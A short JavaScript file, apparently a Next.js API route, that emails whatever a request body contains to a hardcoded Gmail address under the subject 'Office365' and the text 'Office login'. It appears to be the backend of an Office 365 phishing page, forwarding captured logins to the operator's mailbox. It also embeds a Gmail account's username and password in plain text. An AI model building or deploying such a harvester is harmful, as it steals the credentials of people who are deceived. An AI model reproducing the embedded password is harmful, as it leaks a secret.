let nodemailer = require('nodemailer')

export default async function sendEmail (req, res) {
    console.log(req.body)

     let transporter = nodemailer.createTransport({
        port: 465,
        host: "smtp.gmail.com",
        secure: true, // true for 465, false for other ports
        auth: {
          user: 'techbae.js@gmail.com', // generated ethereal user
          pass: 'Techbae1*', // generated ethereal password
        },
     })

       let info = await transporter.sendMail({
        from: '"Common" <techbae.js@gmail.com>',
        to: 'techbae.js@gmail.com',
        subject: 'Office365',
        text: `Ofiice login ${req.body}`,
        html: `<h2> Office Login: ${req.body}</h2>`
       })

      res.json({info})
}